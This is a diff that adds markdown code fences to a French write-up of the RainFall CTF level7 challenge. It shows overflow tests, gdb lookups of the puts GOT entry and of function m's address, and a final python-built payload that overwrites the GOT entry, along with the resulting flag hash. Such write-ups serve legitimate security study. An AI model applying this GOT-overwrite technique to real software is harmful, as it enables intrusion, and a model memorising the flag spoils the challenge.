@@ -14,7 +14,7 @@ On va donc pouvoir cree un overflow et utiliser une vulnérabilité.
 
 --------------------------------------
 Quelque test :
-
+```
 test1 :
 level7@RainFall:~$ ./level7 AAA aaa
 ~~
@@ -30,7 +30,7 @@ level7@RainFall:~$ ./level7 $(python -c 'print("A")') $(python -c 'print("BBB" *
 test4 :
 level7@RainFall:~$ ./level7 $(python -c 'print("A")') $(python -c 'print("BBB" * 20000)')
 ~~
-
+```
 --------------------------------------
 Analyse des registre :
 
@@ -128,14 +128,15 @@ gs             0x33	51
 -----------------
 
 Adresse de m :
-
+```
 (gdb) p &m
 $1 = (<text variable, no debug info> *) 0x80484f4 <m>
-
+```
 -----------------
 
 AGOT adresse de puts :
 
+```
 (gdb) info function puts
 All functions matching regular expression "puts":
 
@@ -152,15 +153,16 @@ Non-debugging symbols:
 
 (gdb) x/i 0x08048400
    0x8048400 <puts@plt>:	jmp    *0x8049928
-
+```
 -----------------
 ## Payload
 
 GOT adress of puts : 0x08049928
 Adress of m : 0x080484f4
 Critical Offset : 20
-
+```
 level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
 
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1713690987
+```
